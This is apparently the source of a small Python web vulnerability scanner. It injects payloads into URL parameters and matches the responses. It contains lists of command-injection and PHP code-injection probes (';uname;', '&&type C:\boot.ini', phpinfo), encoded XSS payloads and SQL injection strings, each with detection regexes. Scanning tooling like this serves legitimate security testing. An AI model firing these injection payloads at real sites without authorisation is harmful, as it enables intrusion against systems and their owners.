#!/usr/bin/env python
# ShubhamWebScript is a Web Applications Security Scanner
# By Shubham Kumar Sinha - hinhiteachcomputer@gmail.com

import requests
import re
import time
from headers import ga  # Assuming ga is some custom formatting module


def send_request(url, payload):
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
        return response
    except requests.RequestException as e:
        # print(f"Request failed: {e}")
        return None


def main_function(url, payloads, check):
    # This function is going to split the url and try the append payloads in every parameter value.
    response = send_request(url, None)
    if response is None:
        return

    vuln = 0
    if response.status_code == 999:
        # Detecting the WebKnight WAF from the StatusCode.
        # print(ga.red + " [~] WebKnight WAF Detected!" + ga.end)
        # print(ga.red + " [~] Delaying 3 seconds between every request" + ga.end)
        time.sleep(3)

    for param in url.split("?")[1].split("&"):
        for payload in payloads:
            bugs = url.replace(param, param + str(payload).strip())
            request = send_request(bugs, None)
            if request is None:
                continue
            html = request.text.splitlines()
            for line in html:
                checker = re.findall(check, line)
                if checker:
                    # print(ga.red + " [*] Payload Found . . ." + ga.end)
                    # print(ga.red + " [*] Payload: " + str(payload) + ga.end)
                    # print(ga.green + " [!] Code Snippet: " + ga.end + line.strip())
                    # print(ga.blue + " [*] POC: " + ga.end + bugs)
                    # print(ga.green + " [*] Happy Exploitation :D" + ga.end)
                    vuln += 1

    if vuln == 0:
        # print(ga.green + " [!] Target is not vulnerable!" + ga.end)
        data = {
            "Good_news": "Target is not vulnerable!",
        }
    else:
        # print(ga.blue + f" [!] Congratulations, you've found {vuln} bugs :-)" + ga.end)
        data = {
            "Bad_news": f"found {vuln} bugs",
        }
    return data


def rce_func(url):
    # print(ga.bold + " [!] Now Scanning for Remote Code/Command Execution " + ga.end)
    # print(ga.blue + " [!] Covering Linux & Windows Operating Systems " + ga.end)
    # print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}',
                '%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B',
                ';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    data_massage = "Scanning for Remote Code/Command Execution"
    data = main_function(url, payloads, check)
    return data, data_massage


def xss_func(url):
    # print(ga.bold + "\n [!] Now Scanning for XSS " + ga.end)
    # print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb',
                '%78%22%78%3e%78',
                '%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb',
                'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
    check = re.compile('zigoo0<svg|x>x', re.I)
    data_massage = "Scanning for XSS"
    data = main_function(url, payloads, check)
    return data, data_massage


def error_based_sqli_func(url):
    # print(ga.bold + "\n [!] Now Scanning for Error Based SQL Injection " + ga.end)
    # print(ga.blue + " [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases " + ga.end)
    # print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
                "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile(
        "Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server|Microsoft.+Database|Fatal.+error",
        re.I)
    data_massage = "Scanning for Error Based SQL Injection"
    data = main_function(url, payloads, check)
    return data, data_massage
